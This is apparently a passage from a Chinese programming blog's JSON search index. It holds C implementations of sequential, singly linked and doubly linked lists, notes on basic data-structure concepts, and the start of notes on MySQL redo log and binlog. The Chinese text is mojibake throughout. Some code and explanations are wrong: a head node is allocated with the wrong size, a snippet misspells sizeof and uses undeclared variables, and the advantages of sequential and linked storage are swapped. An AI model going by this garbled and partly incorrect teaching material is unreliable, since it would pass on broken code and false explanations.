* * @param L * @param i * @return */ElemType GetElem(SqList L, int i) &#123; // åˆ¤æ–­ i çš„å–å€¼èŒƒå›´æ˜¯å¦æœ‰æ•ˆï¼ˆ 1&lt;=i&lt;=L.length) if (i &lt; 1 || i &gt; L.length) &#123; return -1; &#125; return L.data[i-1];&#125;;/** * æ‰“å°çº¿æ€§è¡¨æ‰€æœ‰å…ƒç´  * * @param L */void PrintList(SqList L)&#123; for (int i = 0; i &lt; L.length; ++i) &#123; printf(\"%d \", L.data[i]); &#125; printf(\"\\n\");&#125;;/** * åˆ¤æ–­æ˜¯å¦ä¸ºç©º * * @param L * @return */bool Empty(SqList L)&#123; if (L.length == 0) &#123; return true; &#125; return false;&#125;;/** * é”€æ¯æ“ä½œï¼Œé‡Šæ”¾çº¿æ€§è¡¨æ‰€å å†…å­˜ç©ºé—´ * * @param L * @return */bool DestroyList(SqList &amp;L)&#123; free(L.data); L.length = 0; return true;&#125;; æœ€å¥½æƒ…å†µï¼šåœ¨è¡¨å°¾æ’å…¥å…ƒç´ ï¼Œä¸éœ€è¦ç§»åŠ¨å…ƒç´ ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º O(1)æœ€åæƒ…å†µï¼šåœ¨è¡¨å¤´æ’å…¥å…ƒç´ ï¼Œæ‰€æœ‰å…ƒç´ ä¾æ¬¡åç§»ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º O(n)å¹³å‡æƒ…å†µï¼šåœ¨æ’å…¥ä½ç½®æ¦‚ç‡å‡ç­‰çš„æƒ…å†µä¸‹ï¼Œå¹³å‡ç§»åŠ¨å…ƒç´ çš„æ¬¡æ•°ä¸º n/2ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º O(n) æ—¶é—´å¤æ‚åº¦çš„è®¡ç®—å¿½ç•¥é«˜é˜¶é¡¹çš„ç³»æ•°ï¼Œ scanf ä¼ é€’æ—¶ï¼Œä¸ºä»€ä¹ˆåå°éœ€è¦ç»™ä¸€ä¸ªåœ°å€ï¼Ÿå…¶å®å°±æ˜¯æŒ‡é’ˆä¼ é€’çš„ä½¿ç”¨åœºæ™¯ã€‚ çº¿æ€§è¡¨çš„é“¾å¼å­˜å‚¨å¤´æŒ‡é’ˆï¼šé“¾è¡¨ä¸­ç¬¬ä¸€ä¸ªç»“ç‚¹çš„å­˜å‚¨ä½ç½®ï¼Œç”¨æ¥æ ‡è¯†å•é“¾è¡¨å¤´ç»“ç‚¹ï¼šåœ¨å•é“¾è¡¨ç¬¬ä¸€ä¸ªç»“ç‚¹ä¹‹å‰é™„åŠ çš„ä¸€ä¸ªç»“ç‚¹ï¼Œä¸ºäº†æ“ä½œä¸Šçš„æ–¹ä¾¿ è‹¥é“¾è¡¨æœ‰å¤´ç»“ç‚¹ï¼Œåˆ™å¤´æŒ‡é’ˆæ°¸è¿œæŒ‡å‘å¤´ç»“ç‚¹ï¼Œä¸è®ºé“¾è¡¨æ˜¯å¦ä¸ºç©ºï¼Œå¤´æŒ‡é’ˆå‡ä¸ä¸ºç©ºï¼Œå¤´æŒ‡é’ˆæ˜¯é“¾è¡¨çš„å¿…é¡»å…ƒç´ ï¼Œä»–æ ‡è¯†ä¸€ä¸ªé“¾è¡¨ã€‚ å¤´ç»“ç‚¹æ˜¯ä¸ºäº†æ“ä½œçš„æ–¹ä¾¿è€Œè®¾ç«‹çš„ï¼Œå…¶æ•°æ®åŸŸä¸€èˆ¬ä¸ºç©ºï¼Œæˆ–è€…å­˜æ”¾é“¾è¡¨çš„é•¿åº¦ã€‚æœ‰äº†å¤´ç»“ç‚¹ä¹‹åï¼Œå¯¹åœ¨ç¬¬ä¸€ç»“ç‚¹é’±æ’å…¥å’Œåˆ é™¤ç¬¬ä¸€ç»“ç‚¹çš„æ“ä½œå°±ç»Ÿä¸€äº†ï¼Œä¸éœ€è¦é¢‘ç¹é‡ç½®å¤´æŒ‡é’ˆã€‚ä½†å¤´ç»“ç‚¹ä¸æ˜¯å¿…é¡»çš„ã€‚ å•å‘é“¾è¡¨123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133#include \"LinkList.hpp\"/** * å¤´æ’æ³•å»ºç«‹å•é“¾è¡¨ * æ€è·¯ï¼šå»ºç«‹æ–°çš„ç»“ç‚¹åˆ†é…å†…å­˜ç©ºé—´ï¼Œå°†æ–°ç»“ç‚¹æ’å…¥åˆ°å½“å‰é“¾è¡¨çš„è¡¨å¤´ * * @param L * @param a * @param n * @return */LinkList List_HeadInsert(LinkList &amp;L, int a[], int n) &#123; // åˆ›å»ºå¤´ç»“ç‚¹ L = (LinkList) malloc(sizeof (LNode)); // åˆå§‹åŒ–é“¾è¡¨ L-&gt;next = NULL; LNode *s; for (int i = 0; i &lt; n; i++) &#123; // ç”³è¯·ä¸€ä¸ªæ–°ç©ºé—´ç»™ s s = (LNode *) malloc(sizeof (LNode)); s-&gt;data = a[i]; s-&gt;next = L-&gt;next; L-&gt;next = s; &#125; return L;&#125;;/** * å°¾æ’æ³•å»ºç«‹å•é“¾è¡¨ * æ€è·¯ï¼šå»ºç«‹æ–°çš„ç»“ç‚¹åˆ†é…å†…å­˜ç©ºé—´ï¼Œå°†æ–°ç»“ç‚¹æ’å…¥åˆ°å½“å‰é“¾è¡¨çš„è¡¨å°¾ * * @param L * @return */LinkList List_TailInsert (LinkList &amp;L, int a[], int n)&#123; L = (LinkList) malloc(sizeof(ElemType)); L-&gt;next = NULL; LinkList s, r = L; for (int i = 0; i &lt; n; ++i) &#123; // åˆ›å»ºæ–°ç»“ç‚¹ s = (LNode*)malloc(sizeof(LNode)); s-&gt;data = a[i]; // r æŒ‡å‘æ–°çš„è¡¨å°¾ç»“ç‚¹ r-&gt;next = s; // è¿™ä¸€æ­¥çš„ç›®çš„æ˜¯ä¿è¯ r çš„ next æŒ‡é’ˆæŒ‡å‘æ–°ç©ºé—´ r = s; // è¿™ä¸€æ­¥çš„ç›®çš„æ˜¯ä¿è¯ r æ˜¯é“¾è¡¨çš„å°¾éƒ¨ &#125; r-&gt;next = NULL; return L;&#125;/** * æŒ‰ä½æŸ¥æ‰¾æ“ä½œã€‚è·å–è¡¨ L ä¸­ç¬¬ i ä¸ªä½ç½®çš„å…ƒç´ çš„å€¼ã€‚ * æ€è·¯ï¼šåœ¨å•é“¾è¡¨ä¸­ä»ç¬¬ä¸€ä¸ªç»“ç‚¹å‡ºå‘ï¼Œé¡ºæŒ‡é’ˆnextåŸŸé€ä¸ªå¾€ä¸‹æœç´¢ï¼Œç›´åˆ°æ‰¾åˆ°ç¬¬iä¸ªç»“ç‚¹ä¸ºæ­¢,å¦åˆ™è¿”å›æœ€åä¸€ä¸ªç»“ç‚¹æŒ‡é’ˆåŸŸNULLã€‚ * * @param L * @param i * @return */LNode *GetElem(LinkList L, int i)&#123; int j = 1; // è®© P æŒ‡å‘ç¬¬ä¸€ä¸ªæŒ‡é’ˆ LNode *p = L-&gt;next; if (i == 0) &#123; // å¦‚æœ i = 0ï¼Œè¿”å›å¤´ç»“ç‚¹ return L; &#125; if (i &lt; 1) &#123; // å¦‚æœ i å°äºé›¶ï¼Œè¿”å› NULL return NULL; &#125; while (p &amp;&amp; j &lt; i) &#123; p = p-&gt;next; j ++; &#125; return p;&#125;;/** * æŒ‰å€¼æŸ¥æ‰¾æ“ä½œã€‚åœ¨è¡¨ L ä¸­æŸ¥æ‰¾å…·æœ‰ç»™å®šå…³é”®å®‡å€¼çš„å…ƒç´ ã€‚ * æ€è·¯ï¼šä»å•é“¾è¡¨ç¬¬ä¸€ä¸ªç»“ç‚¹å¼€å§‹ï¼Œç”±å‰å¾€åä¾æ¬¡æ¯”è¾ƒè¡¨ä¸­å„ç»“ç‚¹æ•°æ®åŸŸçš„å€¼ï¼Œè‹¥æŸç»“ç‚¹æ•°æ®åŸŸçš„å€¼ç­‰äºç»™å®šå€¼eï¼Œåˆ™è¿”å›è¯¥ç»“ç‚¹çš„æŒ‡é’ˆ * è‹¥æ•´ä¸ªå•é“¾è¡¨ä¸­æ²¡æœ‰è¿™æ ·çš„ç»“ç‚¹ï¼Œåˆ™è¿”å›NULLã€‚ * * @param L * @param e * @return */LinkList LocateElem(LinkList L, ElemType e) &#123; L = L-&gt;next; while (L) &#123; if (L-&gt;data == e) &#123; break; &#125; L = L-&gt;next; &#125; return L;&#125;/** * è·å–é“¾è¡¨é•¿åº¦ * * @param L * @return */int Length(LNode *L)&#123; L = L-&gt;next; int i = 0; while (L) &#123; i++; L = L-&gt;next; &#125; return i;&#125;/** * æ‰“å°é“¾è¡¨ * * @param L */void PrintLinkList(LinkList L)&#123; L = L-&gt;next; while (L != NULL) &#123; printf(\"%3d\", L-&gt;data); L = L-&gt;next; &#125; printf(\"\\n\");&#125; åŒå‘é“¾è¡¨123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111#include \"LinkList.hpp\"/** * å¤´æ’æ³•å»ºç«‹åŒé“¾è¡¨ * æ€è·¯ï¼šä»å››ä¸ªæ–¹å‘ä¾æ¬¡è¿›è¡Œå…³è”ï¼ˆå¤´ç»“ç‚¹çš„å‰é©±ã€æ–°ç»“ç‚¹çš„å‰é©±ã€æ–°ç»“ç‚¹çš„åç»§ã€å¤´ç»“ç‚¹çš„ next çš„å‰é©±ï¼‰ * * @param DL * @param a * @param n * @return */DLinkList DList_HeadInsert(DLinkList &amp;DL, int a[], int n)&#123; // åˆ›å»ºå¤´ç»“ç‚¹ DL = (DLinkList) malloc(sizeof(DNode)); // å‰é©±å’Œåç»§æŒ‡é’ˆéƒ½æ˜¯NULL DL-&gt;next = NULL; DL-&gt;prior = NULL; DNode *s; for (int i = 0; i &lt; n; ++i) &#123; s = (DLinkList)malloc(sizeof(DNode)); // ç”³è¯·æ–°ç»“ç‚¹ s-&gt;data = a[i]; s-&gt;next = DL-&gt;next; if (DL-&gt;next != NULL) &#123; DL-&gt;next-&gt;prior = s; &#125; s-&gt;prior = DL; DL-&gt;next = s; &#125; return DL;&#125;;/** * å°¾æ’æ³•å»ºç«‹åŒé“¾è¡¨ * * @param DL * @param a * @param n * @return */DLinkList DList_TailInsert(DLinkList &amp;DL, int a[], int n)&#123; DL = (DNode *) malloc(sizeof(DNode)); DLinkList s, r = DL; DL-&gt;prior = NULL; // å‰é©±æŒ‡é’ˆæ˜¯NULL for (int i = 0; i &lt; n; ++i) &#123; s = (DLinkList) malloc(sizeof(DNode)); // ç”³è¯·æ–°ç»“ç‚¹ s-&gt;data = a[i]; r-&gt;next = s; s-&gt;prior = r; r = s; // è¿™ä¸€æ­¥çš„ç›®çš„æ˜¯ä¸ºäº†ä¿è¯ r å§‹ç»ˆæ˜¯å°¾æŒ‡é’ˆ &#125; r-&gt;next = NULL; return DL;&#125;;/** * æŒ‰ä½æŸ¥æ‰¾æ“ä½œ * * @param L * @param i * @return */DNode *GetElemDList(DLinkList DL, int i) &#123; if (i &lt; 0) &#123; return NULL; &#125; int j = 0; while (DL &amp;&amp; j &lt; i) &#123; DL = DL-&gt;next; j++; &#125; return DL;&#125;/** * æŒ‰å€¼æŸ¥æ‰¾æ“ä½œ * * @param L * @param e * @return */DNode *LocateElemDList(DLinkList DL, ElemType e)&#123; DL = DL-&gt;next; while (DL) &#123; if (e == DL-&gt;data) &#123; break; &#125; DL = DL-&gt;next; &#125; return DL;&#125;;/** * æ‰“å°åŒé“¾è¡¨ * * @param L */void PrintDLinkList(DLinkList DL)&#123; DL = DL-&gt;next; while (DL != NULL) &#123; printf(\"%3d\", DL-&gt;data); DL = DL-&gt;next; &#125; printf(\"\\n\");&#125;","categories":[{"name":"æ•°æ®ç»“æ„","slug":"æ•°æ®ç»“æ„","permalink":"https://www.0x2beace.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"æ•°æ®ç»“æ„","slug":"æ•°æ®ç»“æ„","permalink":"https://www.0x2beace.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"æ•°æ®ç»“æ„ï¼ˆä¸€ï¼‰åŸºæœ¬æ¦‚å¿µ","slug":"data-structure-1-basic-concepts","date":"2022-05-24T14:32:43.000Z","updated":"2022-06-17T07:35:22.675Z","comments":true,"path":"data-structure-1-basic-concepts/","link":"","permalink":"https://www.0x2beace.com/data-structure-1-basic-concepts/","excerpt":"åœ¨è®¡ç®—æœºç§‘å­¦ä¸­ï¼Œæ•°æ®ç»“æ„ï¼ˆè‹±è¯­ï¼šdata structureï¼‰æ˜¯è®¡ç®—æœºä¸­å­˜å‚¨ã€ç»„ç»‡æ•°æ®çš„æ–¹å¼ã€‚â€”â€”ç»´åŸºç™¾ç§‘","text":"åœ¨è®¡ç®—æœºç§‘å­¦ä¸­ï¼Œæ•°æ®ç»“æ„ï¼ˆè‹±è¯­ï¼šdata structureï¼‰æ˜¯è®¡ç®—æœºä¸­å­˜å‚¨ã€ç»„ç»‡æ•°æ®çš„æ–¹å¼ã€‚â€”â€”ç»´åŸºç™¾ç§‘ æ•°æ®ç»“æ„æ˜¯ä¸€ç§å…·æœ‰ä¸€å®šé€»è¾‘å…³ç³»ï¼Œåœ¨è®¡ç®—æœºä¸­åº”ç”¨æŸç§å­˜å‚¨ç»“æ„ï¼Œå¹¶ä¸”å°è£…äº†ç›¸åº”æ“ä½œçš„æ•°æ®å…ƒç´ é›†åˆã€‚ å®ƒåŒ…å«ä¸‰æ–¹é¢çš„å†…å®¹ï¼Œé€»è¾‘å…³ç³»ã€å­˜å‚¨å…³ç³»åŠæ“ä½œã€‚ é€»è¾‘ç»“æ„é€»è¾‘ç»“æ„æ˜¯æŒ‡æ•°æ®å…ƒç´ ä¹‹é—´çš„é€»è¾‘å…³ç³»ï¼Œå³ä»é€»è¾‘å…³ç³»ä¸Šæè¿°æ•°æ®ã€‚å®ƒä¸æ•°æ®çš„å­˜å‚¨æ— å…³ï¼Œæ˜¯ç‹¬ç«‹äºè®¡ç®—æœºçš„ æ•°æ®çš„é€»è¾‘ç»“æ„åˆ†ä¸ºçº¿æ€§ç»“æ„å’Œéçº¿æ€§ç»“æ„ é›†åˆç»“æ„ï¼ˆå…ƒç´ åŒå±äºä¸€ä¸ªé›†åˆï¼Œå…ƒç´ ä¹‹é—´ä¸å­˜åœ¨ä»»ä½•å…³ç³»ï¼‰ çº¿æ€§ç»“æ„ï¼ˆå…ƒç´ åªå­˜åœ¨ä¸€å¯¹ä¸€çš„å…³ç³»ï¼‰ æ ‘å½¢ç»“æ„ï¼ˆå…ƒç´ ä¹‹é—´å­˜åœ¨ä¸€ç§ä¸€å¯¹å¤šçš„å±‚æ¬¡å…³ç³»ï¼‰ å›¾å½¢ç»“æ„ï¼ˆå…ƒç´ ä¹‹é—´å­˜åœ¨å¤šå¯¹å¤šçš„å…³ç³»ï¼‰ å­˜å‚¨ç»“æ„å­˜å‚¨ç»“æ„æ˜¯æŒ‡æ•°æ®ç»“æ„åœ¨è®¡ç®—æœºä¸­çš„è¡¨ç¤ºï¼ˆåˆç§°æ˜ åƒï¼‰ï¼Œä¹Ÿç§°ç‰©ç†ç»“æ„ã€‚å®ƒåŒ…æ‹¬æ•°æ®å…ƒç´ çš„è¡¨ç¤ºå’Œå…³ç³»çš„è¡¨ç¤ºã€‚æ•°æ®çš„å­˜å‚¨ç»“æ„æ˜¯é€»è¾‘ç»“æ„ç”¨è®¡ç®—æœºè¯­è¨€çš„å®ç°ï¼Œå®ƒä¾èµ–äºè®¡ç®—æœºè¯­è¨€ã€‚æ•°æ®çš„å­˜å‚¨ç»“æ„ä¸»è¦æœ‰ï¼šé¡ºåºå­˜å‚¨ã€é“¾å¼å­˜å‚¨ã€ç´¢å¼•å­˜å‚¨å’Œæ•£åˆ—å­˜å‚¨ã€‚ å­˜å‚¨ç»“æ„å¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼š é¡ºåºå­˜å‚¨ï¼šå­˜å‚¨çš„ç‰©ç†ä½ç½®ç›¸é‚»ã€‚ï¼ˆp.s. ç‰©ç†ä½ç½®å³ä¿¡æ¯åœ¨è®¡ç®—æœºä¸­çš„ä½ç½®ã€‚ï¼‰ é“¾å¼å­˜å‚¨ï¼šå­˜å‚¨çš„ç‰©ç†ä½ç½®æœªå¿…ç›¸é‚»ï¼Œé€šè¿‡è®°å½•ç›¸é‚»å…ƒç´ çš„ç‰©ç†ä½ç½®æ¥æ‰¾åˆ°ç›¸é‚»å…ƒç´ ã€‚ ç´¢å¼•å­˜å‚¨ï¼šç±»ä¼¼äºç›®å½•ã€‚ æ•£åˆ—å­˜å‚¨ï¼šé€šè¿‡å…³é”®å­—ç›´æ¥è®¡ç®—å‡ºå…ƒç´ çš„ç‰©ç†åœ°å€ã€‚ C è¯­è¨€å®ç°é¡ºåºå­˜å‚¨ï¼š 12int arr[6] = &#123;1,2,3,4,5,6&#125;; // å®šä¹‰æ•°ç»„å¹¶åˆå§‹åŒ–printf(\"%d \\n\", arr[3]); é¡ºåºç»“æ„çš„ä¼˜ç‚¹ï¼š å……åˆ†åˆ©ç”¨æ‰€æœ‰çš„å­˜å‚¨å•å…ƒï¼Œä¸ä¼šå‡ºç°ç¢ç‰‡ç°è±¡ ç¼ºç‚¹ï¼š éœ€è¦é¢å¤–ç©ºé—´ç”¨æ¥å­˜æ”¾ä¸‹ä¸€ç»“ç‚¹çš„æŒ‡é’ˆ åªèƒ½å®ç°é¡ºåºå­˜å‚¨ C è¯­è¨€å®ç°é“¾å¼å­˜å‚¨ï¼š 1234567891011typedef struct Lnode&#123; Element data; struct Lnode *next;&#125;Lnode, *LinkList;// å®šä¹‰ä¸€ä¸ªæŒ‡é’ˆLnode *L;L = (LinkList)malloc(sizfof(Lnode));A-&gt;next = B;B-&gt;next = C; é“¾å¼ç»“æ„çš„ä¼˜ç‚¹ï¼š å¯ä»¥å®ç°éšæœºå­˜å– æ¯ä¸ªå…ƒç´ å ç”¨æœ€å°‘çš„ç©ºé—´ ç¼ºç‚¹ï¼š åªèƒ½ä½¿ç”¨æ•´å—çš„å­˜å‚¨å•å…ƒï¼Œä¼šäº§ç”Ÿè¾ƒå¤šçš„ç¢ç‰‡ åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼ŒA åªçŸ¥é“ B çš„åœ°å€ï¼ŒB åªçŸ¥é“ C çš„åœ°å€ï¼ŒA ä¸èƒ½ç›´æ¥è®¿é—®åˆ° Cï¼Œå› ä¸ºå®ƒä¸çŸ¥é“ C çš„åœ°å€ã€‚ è¿™å°±æ˜¯é“¾å¼ç»“æ„åªèƒ½å®ç°é¡ºåºå­˜å‚¨çš„åŸå› ã€‚ å¸¸ç”¨ç®—æ³•æ•°æ®ç»“æ„ç ”ç©¶çš„å†…å®¹ï¼Œå°±æ˜¯å¦‚ä½•æŒ‰ä¸€å®šçš„é€»è¾‘ç»“æ„ï¼ˆçº¿æ€§ç»“æ„è¿˜æ˜¯æ ‘å½¢ç»“æ„ï¼‰ï¼ŒæŠŠæ•°æ®ç»„ç»‡èµ·æ¥ï¼Œå¹¶é€‰æ‹©é€‚å½“çš„å­˜å‚¨ç»“æ„ï¼ˆé¡ºåºå­˜å‚¨è¿˜æ˜¯é“¾å¼å­˜å‚¨ï¼‰æŠŠé€»è¾‘ç»“æ„ç»„ç»‡å¥½çš„æ•°æ®å­˜å‚¨åˆ°è®¡ç®—æœºçš„å‚¨å­˜å™¨é‡Œã€‚ ç®—æ³•ç ”ç©¶çš„ç›®çš„æ˜¯ä¸ºäº†æ›´æœ‰æ•ˆçš„å¤„ç†æ•°æ®ï¼Œæé«˜æ•°æ®è¿ç®—æ•ˆç‡ã€‚æ•°æ®çš„è¿ç®—æ˜¯å®šä¹‰åœ¨æ•°æ®çš„é€»è¾‘ç»“æ„ä¸Šï¼Œä½†è¿ç®—çš„å…·ä½“å®ç°è¦åœ¨å­˜å‚¨ç»“æ„ä¸Šè¿›è¡Œã€‚ä¸€èˆ¬æœ‰ä»¥ä¸‹å‡ ç§å¸¸ç”¨è¿ç®—ï¼š æ£€ç´¢ï¼šæ£€ç´¢å°±æ˜¯åœ¨æ•°æ®ç»“æ„é‡ŒæŸ¥æ‰¾æ»¡è¶³ä¸€å®šæ¡ä»¶çš„èŠ‚ç‚¹ã€‚ä¸€èˆ¬æ˜¯ç»™å®šä¸€ä¸ªæŸå­—æ®µçš„å€¼ï¼Œæ‰¾å…·æœ‰è¯¥å­—æ®µå€¼çš„èŠ‚ç‚¹ã€‚ æ’å…¥ï¼šå¾€æ•°æ®ç»“æ„ä¸­å¢åŠ æ–°çš„èŠ‚ç‚¹ã€‚ åˆ é™¤ï¼šæŠŠæŒ‡å®šçš„ç»“ç‚¹ä»æ•°æ®ç»“æ„ä¸­å»æ‰ã€‚ æ›´æ–°ï¼šæ”¹å˜æŒ‡å®šèŠ‚ç‚¹çš„ä¸€ä¸ªæˆ–å¤šä¸ªå­—æ®µçš„å€¼ã€‚ æ’åºï¼šæŠŠèŠ‚ç‚¹æŒ‰æŸç§æŒ‡å®šçš„é¡ºåºé‡æ–°æ’åˆ—ã€‚ä¾‹å¦‚é€’å¢æˆ–é€’å‡ã€‚","categories":[{"name":"æ•°æ®ç»“æ„","slug":"æ•°æ®ç»“æ„","permalink":"https://www.0x2beace.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"æ•°æ®ç»“æ„","slug":"æ•°æ®ç»“æ„","permalink":"https://www.0x2beace.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"02 æ—¥å¿—ç³»ç»Ÿï¼šä¸€æ¡SQLæ›´æ–°è¯­å¥æ˜¯å¦‚ä½•æ‰§è¡Œçš„","slug":"logging-system-how-an-sql-update-statement-is-executed","date":"2022-05-22T09:06:40.000Z","updated":"2022-05-24T02:20:27.783Z","comments":true,"path":"logging-system-how-an-sql-update-statement-is-executed/","link":"","permalink":"https://www.0x2beace.com/logging-system-how-an-sql-update-statement-is-executed/","excerpt":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚","text":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ äº†è§£ redo logï¼ˆé‡åšæ—¥å¿—ï¼‰å’Œ binlogï¼ˆå½’æ¡£æ—¥å¿—ï¼‰ è¾“å…¥ä¸€æ¡updateè¯­å¥ï¼Œåœ¨ Mysql å†…éƒ¨ä¸­æ‰§è¡Œäº†æ€æ ·çš„è¿‡ç¨‹ é‡è¦çš„æ—¥å¿—æ¨¡å—:redo logå½“æœ‰ä¸€æ¡è®°å½•éœ€è¦æ›´æ–°çš„æ—¶å€™ï¼ŒInnoDB å¼•æ“å°±ä¼šå…ˆæŠŠè®°å½•å†™åˆ° redo log é‡Œé¢ï¼Œå¹¶æ›´æ–°å†…å­˜ï¼Œè¿™ä¸ªæ—¶å€™æ›´æ–°å°±ç®—å®Œæˆäº†ã€‚ åŒæ—¶ï¼ŒInnoDB å¼•æ“ä¼šåœ¨é€‚å½“çš„æ—¶å€™ï¼Œ å°†è¿™ä¸ªæ“ä½œè®°å½•æ›´æ–°åˆ°ç£ç›˜é‡Œé¢ï¼Œè€Œè¿™ä¸ªæ›´æ–°å¾€å¾€æ˜¯åœ¨ç³»ç»Ÿæ¯”è¾ƒç©ºé—²çš„æ—¶å€™åšã€‚ ä¸æ­¤ç±»ä¼¼ï¼ŒInnoDB çš„ redo log æ˜¯å›ºå®šå¤§å°çš„ï¼Œæ¯”å¦‚å¯ä»¥é…ç½®ä¸ºä¸€ç»„ 4 ä¸ªæ–‡ä»¶ï¼Œæ¯ä¸ªæ–‡ä»¶ çš„å¤§å°æ˜¯ 1GBï¼Œé‚£ä¹ˆä¸€å…±å¯ä»¥è®°å½• 4GB çš„æ“ä½œã€‚ä»å¤´å¼€å§‹å†™ï¼Œå†™åˆ°æœ«å°¾å°± åˆå›åˆ°å¼€å¤´å¾ªç¯å†™ï¼Œå¦‚ä¸‹é¢è¿™ä¸ªå›¾æ‰€ç¤ºã€‚ write pos æ˜¯å½“å‰è®°å½•çš„ä½ç½®ï¼Œä¸€è¾¹å†™ä¸€è¾¹åç§»ï¼Œå†™åˆ°ç¬¬ 3 å·æ–‡ä»¶æœ«å°¾åå°±å›åˆ° 0 å·æ–‡ä»¶ å¼€å¤´ã€‚checkpoint æ˜¯å½“å‰è¦æ“¦é™¤çš„ä½ç½®ï¼Œä¹Ÿæ˜¯å¾€åæ¨ç§»å¹¶ä¸”å¾ªç¯çš„ï¼Œæ“¦é™¤è®°å½•å‰è¦æŠŠè®°å½•æ›´æ–°åˆ°æ•°æ®æ–‡ä»¶ã€‚ write pos å’Œ checkpoint ä¹‹é—´çš„æ˜¯å‰©ä½™ç©ºç€çš„éƒ¨åˆ†ï¼Œå¯ä»¥ç”¨æ¥è®°å½•æ–°çš„æ“ä½œã€‚å¦‚ æœ write pos è¿½ä¸Š checkpointï¼Œè¡¨ç¤ºâ€œç²‰æ¿â€æ»¡äº†ï¼Œè¿™æ—¶å€™ä¸èƒ½å†æ‰§è¡Œæ–°çš„æ›´æ–°ï¼Œå¾—åœä¸‹ æ¥å…ˆæ“¦æ‰ä¸€äº›è®°å½•ï¼ŒæŠŠ checkpoint æ¨è¿›ä¸€ä¸‹ã€‚ æœ‰äº† redo logï¼ŒInnoDB å°±å¯ä»¥ä¿è¯å³ä½¿æ•°æ®åº“å‘ç”Ÿå¼‚å¸¸é‡å¯ï¼Œä¹‹å‰æäº¤çš„è®°å½•éƒ½ä¸ä¼šä¸¢ å¤±ï¼Œè¿™ä¸ªèƒ½åŠ›ç§°ä¸ºcrash-safeã€‚ é‡è¦çš„æ—¥å¿—æ¨¡å—:binlogMySQL æ•´ä½“æ¥çœ‹ï¼Œå…¶å®å°±æœ‰ä¸¤å—:ä¸€å—æ˜¯ Server å±‚ï¼Œå®ƒä¸»è¦åšçš„æ˜¯ MySQL åŠŸèƒ½å±‚é¢çš„äº‹æƒ…;è¿˜æœ‰ä¸€å—æ˜¯å¼•æ“å±‚ï¼Œè´Ÿè´£å­˜å‚¨ç›¸å…³çš„å…·ä½“äº‹å®œã€‚ä¸Šé¢æˆ‘ä»¬èŠåˆ° redo log æ˜¯ InnoDB å¼•æ“ç‰¹æœ‰çš„æ—¥å¿—ï¼Œè€Œ Server å±‚ä¹Ÿæœ‰è‡ªå·±çš„æ—¥å¿—ï¼Œç§°ä¸º binlog(å½’æ¡£æ—¥å¿—)ã€‚ redo log ä¸ binlog æœ‰ä»¥ä¸‹å‡ ç‚¹åŒºåˆ«ï¼š redo log æ˜¯ InnoDB å¼•æ“ç‰¹æœ‰çš„; binlog æ˜¯ MySQL çš„ Server å±‚å®ç°çš„ï¼Œæ‰€æœ‰å¼•æ“éƒ½ å¯ä»¥ä½¿ç”¨ã€‚ redo log æ˜¯ç‰©ç†æ—¥å¿—ï¼Œè®°å½•çš„æ˜¯â€œåœ¨æŸä¸ªæ•°æ®é¡µä¸Šåšäº†ä»€ä¹ˆä¿®æ”¹â€; binlog æ˜¯é€»è¾‘æ—¥å¿—ï¼Œè®°å½•çš„æ˜¯è¿™ä¸ªè¯­å¥çš„åŸå§‹é€»è¾‘ï¼Œæ¯”å¦‚â€œç»™ ID=2 è¿™ä¸€è¡Œçš„ c å­—æ®µåŠ  1 â€ã€‚ redo log æ˜¯å¾ªç¯å†™çš„ï¼Œç©ºé—´å›ºå®šä¼šç”¨å®Œ; binlog æ˜¯å¯ä»¥è¿½åŠ å†™å…¥çš„ã€‚â€œè¿½åŠ å†™â€æ˜¯æŒ‡ binlog æ–‡ä»¶å†™åˆ°ä¸€å®šå¤§å°åä¼šåˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªï¼Œå¹¶ä¸ä¼šè¦†ç›–ä»¥å‰çš„æ—¥å¿—ã€‚ æ‰§è¡Œå™¨å’Œ InnoDB å¼•æ“åœ¨æ‰§è¡Œè¿™ä¸ªç®€å•çš„ update è¯­å¥æ—¶çš„å†…éƒ¨æµç¨‹ï¼š æ‰§è¡Œå™¨å…ˆæ‰¾å¼•æ“å– ID=2 è¿™ä¸€è¡Œã€‚ID æ˜¯ä¸»é”®ï¼Œå¼•æ“ç›´æ¥ç”¨æ ‘æœç´¢æ‰¾åˆ°è¿™ä¸€è¡Œã€‚å¦‚æœ ID=2 è¿™ä¸€è¡Œæ‰€åœ¨çš„æ•°æ®é¡µæœ¬æ¥å°±åœ¨å†…å­˜ä¸­ï¼Œå°±ç›´æ¥è¿”å›ç»™æ‰§è¡Œå™¨;å¦åˆ™ï¼Œéœ€è¦å…ˆä»ç£ç›˜ è¯»å…¥å†…å­˜ï¼Œç„¶åå†è¿”å›ã€‚ 